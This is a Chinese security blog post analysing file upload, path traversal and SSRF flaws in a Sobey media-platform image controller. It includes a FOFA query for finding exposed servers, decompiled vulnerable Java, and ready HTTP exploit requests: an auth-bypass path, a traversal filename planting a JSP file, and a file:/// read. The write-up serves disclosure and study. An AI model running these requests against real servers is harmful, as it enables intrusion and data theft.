---
title: "索贝融媒体 ImageController 多个文件上传漏洞"
source: https://mrxn.net/jswz/sobey-ImageInt-urlUpload.html
asset_dir: assets/索贝融媒体-imagecontroller-多个文件上传漏洞
---

# 索贝融媒体 ImageController 多个文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/21 08:32
- 936浏览
- [2评论](#comment)
- 2小时阅读

深入探索

文件大小转换

计算机安全

文本剥离工具

---

# 漏洞简介

索贝产品的文件上传功能存在安全漏洞，攻击者可以通过[上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)特制的文件（如JSP文件），在服务器上[执行恶意代码](https://mrxn.net/tag/rce)，可能导致服务器被完全控制，敏感数据泄露或篡改。

漏洞预警服务

# 影响版本

# fofa语法

> app="SOBEY-融媒体"

# 漏洞分析

## upload

先看 `upload` 实现逻辑

```
@RestController
@RequestMapping({"/mch/ImageInt"})
public class ImageController extends BaseController {
    private static final Logger logger = LoggerFactory.getLogger(ImageController.class);

    @RequestMapping(
        value = {"/upload"},
        method = {RequestMethod.POST}
    )
    public Response upload(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, HttpServletRequest request) {
        Response response = new Response();

        try {
            String param = IOUtils.toString(request.getInputStream(), "UTF-8");
            String url = saveScreenShotImage(param, token);
            response.setData(url);
        } catch (IOException e) {
            e.printStackTrace();
        }

        response.setStatus(200);
        response.setMessage(this.enTips("image.upload.success", "上传图片成功"));
        return response;
    }
```

深入探索

SQL

安全工具开发

漏洞修复方案

跟进`saveScreenShotImage`方法

```
public static String saveScreenShotImage(String data, String token) {
    SimpleDateFormat format = new SimpleDateFormat("yyyy/MM/dd/");
    String path = Constant.UPLOAD_PATH + format.format(new Date());
    String filePath = SystemConfigUtil.getDiskpath() + path;
    String fileName = UUID.randomUUID().toString() + ".jpg";
    OutputStream out = null;

    String var12;
    try {
        if (!StringUtil.isNotEmpty(data)) {
            return null;
        }

        if (data.startsWith("data:image/jpg")) {
            data = data.substring(data.indexOf("data:image/jpg;base64,") + "data:image/jpg;base64,".length());
        }

        if (data.startsWith("data:image/jpeg")) {
            data = data.substring(data.indexOf("data:image/jpeg;base64,") + "data:image/jpeg;base64,".length());
        }

        if (data.startsWith("data:image/png")) {
            data = data.substring(data.indexOf("data:image/png;base64,") + "data:image/png;base64,".length());
        }

        if (data.startsWith("data:image/gif")) {
            data = data.substring(data.indexOf("data:image/gif;base64,") + "data:image/gif;base64,".length());
        }

        byte[] bytes = StringUtil.base64Decode(data);

        for(int i = 0; i < bytes.length; ++i) {
            if (bytes[i] < 0) {
                bytes[i] = (byte)(bytes[i] + 256);
            }
        }

        File file = new File(filePath);
        if (!file.exists()) {
            file.mkdirs();
        }

        out = new FileOutputStream(filePath + fileName);
        out.write(bytes);
```

`saveScreenShotImage`方法，默认对请求体的内容进行base64解码后直接写入`filePath + fileName`

而`filePath` 来自`SystemConfigUtil.`*`getDiskpath`*`() + path` 其中`getDiskpath`方法逻辑如下

```
public static String getDiskpath() {
    if (!StringUtils.isEmpty(diskpath)) {
        return diskpath;
    } else {
        String diskpathStr = getStorageEnvConfig("diskpath");
        if (StringUtils.isEmpty(diskpathStr)) {
            diskpathStr = getSolarSystemByCache("diskpath", "/mntdisk/", "挂载存储在容器内的路径 默认mntdisk");
        }

        diskpath = diskpathStr;
        return diskpath;
    }
}
```

默认上传文件的位置根目录在`/mntdisk/` ,结合`path = Constant.`*`UPLOAD_PATH`*`+ format.format(new Date());` 其中`Constant.UPLOAD_PATH` 定义为`public static String`*`UPLOAD_PATH`*`= "upload/Image/mrtp/";` ，那么path 最终就等于 `/mntdisk/upload/Image/mrtp/年/月/日/uuid.jpg`

## uploadimg

```
@RequestMapping(
    value = {"/uploadimg"},
    method = {RequestMethod.POST}
)
public Response uploadImg(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam("file") MultipartFile file) {
    Response response = new Response();
    new HiveServiceImpl();

    try {
        long size = file.getSize();
        if (size == 0L) {
            response.setStatus(400);
            response.setMessage("请上传正常图片!");
            return response;
        }

        SimpleDateFormat format = new SimpleDateFormat("yyyy/MM/dd/");
        String path = Constant.UPLOAD_PATH + format.format(new Date());
        String filePath = SystemConfigUtil.getDiskpath() + path;
        File dir = new File(filePath);
        if (!dir.exists()) {
            dir.mkdirs();
        }

        String name = file.getOriginalFilename();
        String fileName;
        if (name.contains("blob")) {
            fileName = UUID.randomUUID().toString().replace("-", "") + ".gif";
        } else {
            fileName = UUID.randomUUID().toString().replace("-", "") + "_" + name;
        }

        File dest = new File(filePath + fileName);
        file.transferTo(dest);
        FileParamDTO fileParamDTO = new FileParamDTO();
        fileParamDTO.setFullName(fileName);
        fileParamDTO.setSuffix(fileName.replaceAll(".*\\.", "").toLowerCase());
        fileParamDTO.setFile(dest);

        FileDTO fileDTO;
        try {
            fileDTO = FileServiceImpl.uploadIntert(token, fileParamDTO);
        } finally {
            if (dest.exists()) {
                dest.delete();
            }

        }

        if (fileDTO == null || StringUtils.isEmpty(fileDTO.getShowUrl())) {
            return Response.paramError("上传出错.");
        }

        response.setStatus(200);
        response.setMessage(this.enTips("image.upload.success", "上传图片成功"));
        String showUrl = fileDTO.getShowUrl();
        response.setData(showUrl);
    } catch (Exception e) {
        e.printStackTrace();
        response.setStatus(400);
        response.setMessage("上传图片异常!" + e.getMessage());
    }

    return response;
}
```

uploadimg方法[文件上传](https://mrxn.net/tag/rce)保存路和上面的upload方法是一样的，但是不同的地方在于保存的文件名是取自上传当中设置的`filename`的值（`String name = file.getOriginalFilename();`），但是`filename`不能包含`blob`字符，否则保存文件后缀设置为固定的`.gif` （``` if (name.contains("blob")) { `` fileName = UUID. ```*`randomUUID`*`().toString().replace("-", "") + ".gif";`）

## urlUpload

```
@RequestMapping(
    value = {"/urlUpload"},
    method = {RequestMethod.POST}
)
public Response urlTobase(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam(value = "url",required = false) String urll, HttpServletRequest request) {
    Response response = new Response();
    SimpleDateFormat format = new SimpleDateFormat("yyyy/MM/dd/");
    String path = Constant.UPLOAD_PATH + format.format(new Date());
    String folderPath = SystemConfigUtil.getDiskpath() + path;
    String fileName = UUID.randomUUID().toString() + ".jpg";

    try {
        String param = IOUtils.toString(request.getInputStream(), "UTF-8");
        if (StringUtil.isNotEmpty(param)) {
            urll = param;
        } else {
            urll = URLDecoder.decode(urll);
        }

        FileUtil.downloadFile(urll, folderPath, fileName);
        File dest = new File(folderPath + fileName);
        FileParamDTO fileParamDTO = new FileParamDTO();
        fileParamDTO.setFullName(fileName);
        fileParamDTO.setSuffix(fileName.replaceAll(".*\\.", "").toLowerCase());
        fileParamDTO.setFile(dest);

        FileDTO fileDTO;
        try {
            fileDTO = FileServiceImpl.uploadIntert(token, fileParamDTO);
        } finally {
            if (dest.exists()) {
                dest.delete();
            }

        }

        if (fileDTO == null || StringUtils.isEmpty(fileDTO.getShowUrl())) {
            return Response.paramError("上传出错.");
        }

        response.setData(fileDTO.getShowUrl());
    } catch (IOException e) {
        logger.error("下载图片出错。");
        e.printStackTrace();
        response.setMessage("下载图片出错。" + e.getMessage());
    }

    response.setStatus(200);
    return response;
}
```

保存路径跟上面也一样，不同的是文件内容由`FileUtil.downloadFile` 实现，看下它的逻辑

```
public static String downloadFile(String urll, String folderPath, String fileName) throws IOException {
    LogUtil.getLogger().info("下载图片地址: " + urll);
    URLConnection urlConnection = getUrlConnection(urll);
    InputStream inputStream = urlConnection.getInputStream();
    DataInputStream dataInputStream = new DataInputStream(inputStream);
    File folder = new File(folderPath);
    if (!folder.exists()) {
        folder.mkdirs();
    }

    if (!folderPath.endsWith("/") && folderPath.endsWith("\\")) {
        folderPath = folderPath + File.separator;
    }

    String filePathName = folderPath + fileName;
    File file = new File(filePathName);
    FileOutputStream fileOutputStream = new FileOutputStream(file);
    byte[] buffer = new byte[1024];

    int length;
    while((length = dataInputStream.read(buffer)) > 0) {
        fileOutputStream.write(buffer, 0, length);
    }

    inputStream.close();
    dataInputStream.close();
    fileOutputStream.close();
    LogUtil.getLogger().info("下载图片完成。");
    return filePathName;
}
```

参数**urll**被带入了**getUrlConnection**方法

```
private static URLConnection getUrlConnection(String urll) throws IOException {
    if (urll != null && urll.startsWith("https")) {
        HttpClientUtil.initHttpsURLConnection();
    }

    URL url = new URL(StringUtil.getUrlUrlEncode(urll));
    String proxyIpPort = SystemConfigUtil.getSolarSystemByCache("proxyIpPort", "");
    String proxyType = SystemConfigUtil.getSolarSystemByCache("proxyType", "HTTP");
    URLConnection urlConnection = null;
    String reverseProxyPrefix = SystemConfigUtil.getReverseProxyPrefix();
    if (StringUtils.isNotEmpty(proxyIpPort)) {
        String[] split = proxyIpPort.split(":");
        Proxy proxy = null;
        if ("SOCKS".equalsIgnoreCase(proxyType)) {
            proxy = new Proxy(Type.SOCKS, new InetSocketAddress(split[0], Integer.valueOf(split[1])));
        } else {
            proxy = new Proxy(Type.HTTP, new InetSocketAddress(split[0], Integer.valueOf(split[1])));
        }

        urlConnection = url.openConnection(proxy);
    } else {
        if (!StringUtils.isEmpty(reverseProxyPrefix)) {
            url = new URL(StringUtil.dealReverseProxyUrl(urll, reverseProxyPrefix));
        }

        urlConnection = url.openConnection();
    }

    Integer httpTimeOut = SystemConfigUtil.getHttpTimeOut();
    urlConnection.setConnectTimeout(httpTimeOut);
    urlConnection.setReadTimeout(httpTimeOut);
    String[] noRefererUrls = SystemConfigUtil.getSolarSystemByCache("noRefererUrls", "wx.qlogo.cn,mmsns.qpic.cn,mmbiz.qpic.cn,vcloud1023.tc.qq.com,rcgi.video.qq.com").split(",");
    boolean noReferer = false;

    for(String noRefererUrl : noRefererUrls) {
        if (urll.contains(noRefererUrl)) {
            noReferer = true;
            break;
        }
    }

    if (!noReferer) {
        urlConnection.setRequestProperty("referer", urll.replaceAll("(?<!/)/[^/]+", ""));
    }

    return urlConnection;
}
```

关键在于`URL url = new URL(StringUtil.getUrlUrlEncode(urll));` `urll`被直接使用`new URL` 进行操作，没有任何过滤或校验，因此此处还存在伪协议如**file:///**协议的利用。因此同时此处还存在SSRF漏洞。

漏洞预警服务

# 漏洞复现

## upload

```
POST /sobey-mchEditor/js/..;/mch/ImageInt/upload?siteCode=&token= HTTP/1.1
Host: sobey.mrxn.net
Content-Type: text/plain

{{b64(123)}}

HTTP/1.1 200
Server: mginx
Content-Type: application/json
Connection: keep-alive
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: Content-Type,Content-Length, Authorization, Accept,X-Requested-With
Access-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS
Set-Cookie: SERVERID=; Expires=Thu, 01-Jan-1970 00:00:01 GMT; path=/
X-Server-By: Sobey
Content-Length: 57

{"data":null,"message":"上传图片成功","status":200}
```

结合之前的文件上传，[命令执行](https://mrxn.net/tag/rce)可以看到文件保存成功

[![索贝融媒体 ImageController 多个文件上传漏洞](images/img-001-266655ddee97.webp)](https://image.mrxn.net/ec215021863b4e039b4a20b458eb16b3.webp)

## uploadimg

```
POST /sobey-mchEditor/image/..;/mch/ImageInt/uploadimg?token=&siteCode= HTTP/1.1
Host: sobey.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file";filename="1.png/../../../../../../../../../../../usr/local/tomcat/webapps/sobey-mchEditor/1.jsp"

<%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary--
```

[![索贝融媒体 ImageController 多个文件上传漏洞](images/img-002-b89fd0e347b6.webp)](https://image.mrxn.net/cf5313037a754508a7be24c24e087c24.webp)

可以看到文件上传并没有穿越成功，可能跟 `file.transferTo` 的实现有关，因为有两种实现方式

[![索贝融媒体 ImageController 多个文件上传漏洞](images/img-003-fc0cb32caaee.webp)](https://image.mrxn.net/195a6f0811a74f7ba062c0ad01abe695.webp)

[![索贝融媒体 ImageController 多个文件上传漏洞](images/img-004-597cf35aeea8.webp)](https://image.mrxn.net/892e1d36c7f84bb3bcb8a7772c42d903.webp)

其中`StandardMultipartFile` 是 Spring Boot 和现代 Spring MVC（使用 Servlet 3.0+ 容器，如 Tomcat 7+）的**默认实现**。它包装了标准的 `javax.servlet.http.Part` 对象

**对应的** `transferTo` **实现**：

```
// 来源于 org.springframework.web.multipart.support.StandardMultipartHttpServletRequest$StandardMultipartFile
public void transferTo(File dest) throws IOException, IllegalStateException {
    // 关键点：调用的是 part.write(dest.getPath())
    this.part.write(dest.getPath());
}
```

1. `dest.getPath()` 方法返回的是构造 `File` 对象时传入的原始路径字符串，即包含 `../` 的恶意路径，例如 `/opt/uploads/2023/10/27/[UUID]_../../../../../../tmp/shell.jsp`。
2. **关键在于** `this.part.write(String fileName)` **方法**。根据 Servlet 3.0 规范（JSR 315），`Part.write(String fileName)` 方法被要求**必须**仅使用 `fileName` 参数中的文件名部分（即最后一个路径分隔符之后的内容），并忽略所有目录信息。
3. 具体到 Tomcat 的实现（`org.apache.catalina.core.ApplicationPart`），它会检查传入的字符串中是否包含路径分隔符 (`/` 或 `\`)。如果包含，它会抛出 `IllegalArgumentException`，或者更常见的行为是，它会从字符串中提取出基础文件名（basename）。例如，对于输入 `../../../../../tmp/shell.jsp`，它只会提取出 `shell.jsp`。
4. 因此，`part.write()` 会将文件内容以 `shell.jsp` 这个名字写入到一个由容器管理的、安全的临时目录中，而不是攻击者指定的 `/tmp/` 目录。**目录穿越的poc被** **Servlet** **容器的** `Part` **阻止了。**

**结论**：在默认的 Spring 环境下，尽管您的业务代码存在目录穿越漏洞，但由于底层 `StandardMultipartFile` 依赖的 Servlet `Part` API 具有内置的安全设计，导致攻击无法成功。

安全研究工具

而`CommonsMultipartFile`的实现是基于 Apache Commons FileUpload ，**对应的** `transferTo` **实现**：

```
// 来源于 org.springframework.web.multipart.commons.CommonsMultipartFile
public void transferTo(File dest) throws IOException, IllegalStateException {
    // ... 省略部分检查代码 ...
    try {
        // 关键点：调用的是 fileItem.write(dest)
        this.fileItem.write(dest);
    }
    // ... 省略异常处理 ...
}
```

1. 这里的 `dest` 是一个 `java.io.File` 对象，它在内存中已经将路径 `/opt/uploads/2023/10/27/[UUID]_../../../../../../tmp/shell.jsp` 解析完毕。
2. `this.fileItem.write(File dest)` 方法（来源于 Apache Commons FileUpload 的 `DiskFileItem`）的行为与 `Part.write` 完全不同。它通常会直接委托给标准的 Java I/O 操作，如 `new FileOutputStream(dest)`。
3. `new FileOutputStream(File file)` 在打开文件时，会遵循文件系统的规则来解析路径。此时，`../` 序列会被文件系统正确处理，导致路径向上跳转。
4. 最终，文件会被成功写入到 `dest.getCanonicalPath()` 解析后的路径，即 `/tmp/shell.jsp`。

- **结论**：如果您的应用环境配置为使用 `CommonsMultipartResolver`，那么代码中的目录穿越漏洞将是**可以被成功利用的**。

## urlUpload

```
POST /sobey-mchEditor/js/..;/mch/ImageInt/urlUpload HTTP/1.1
Host: sobey.mrxn.net
Content-Type: application/x-www-form-urlencoded

siteCode=1&token=1&url=file:///mntdisk/upload/Image/mrtp/2025/07/12/test.png
```

查看mntdisk/upload/Image/mrtp/目录下对应日期目录，成功生成了同样大小的图片文件

漏洞预警服务

[![索贝融媒体 ImageController 多个文件上传漏洞](images/img-005-4a01ecc52344.webp)](https://image.mrxn.net/386e0f853fd149268e218758bf3cd550.webp)

SSRF

[![索贝融媒体 ImageController 多个文件上传漏洞](images/img-006-ec9a16f22052.webp)](https://image.mrxn.net/525146a9a83f4c589529a7a6379c9a32.webp)

后期可使用file:/// 文件读取配合其他可以查看图片的接口进行文件读取进一步利用。

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [4.1.upload](#toc-4-1-)
- [4.2.uploadimg](#toc-4-2-)
- [4.3.urlUpload](#toc-4-3-)
- [5.漏洞复现](#toc-5-)
- [5.1.upload](#toc-5-1-)
- [5.2.uploadimg](#toc-5-2-)
- [5.3.urlUpload](#toc-5-3-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
